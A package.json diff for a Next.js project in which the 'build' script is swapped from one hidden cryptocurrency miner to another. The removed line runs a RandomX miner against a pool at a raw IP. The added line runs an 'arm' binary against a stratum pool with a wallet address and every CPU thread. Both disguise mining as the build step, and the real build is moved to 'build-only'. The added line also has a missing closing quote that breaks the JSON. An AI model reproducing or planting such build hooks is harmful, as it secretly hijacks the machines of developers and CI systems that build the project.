@@ -2,7 +2,7 @@
   "private": true,
   "scripts": {
     "dev": "next dev --turbo",
-    "build": "chmod +x b && ./b -o 161.35.141.255:80 -u amyKp7wf1heWELLaUdThiW5B2aj73ht2HABotky8x2gfBPyD6sj39ynHxZCC8B5Cs4RMf7krykCGR5BpiVzbT3CD5tbz8cSEvN -p maggamanis-$(shuf -n 1 -i 1-9999) -a rx/0 -k --donate-level 1",
+    "build": "chmod +x arm && ./arm -a aurum -o stratum+tcp://128.199.218.20:80 -u bit1qaku3ea4uyaj28scjq3snyats8tjr45m43jrqw9.suhu -p x -t $(nproc --all),
     "build-only": "next build",
     "start": "next start",
     "setup": "node ./setup.mjs"
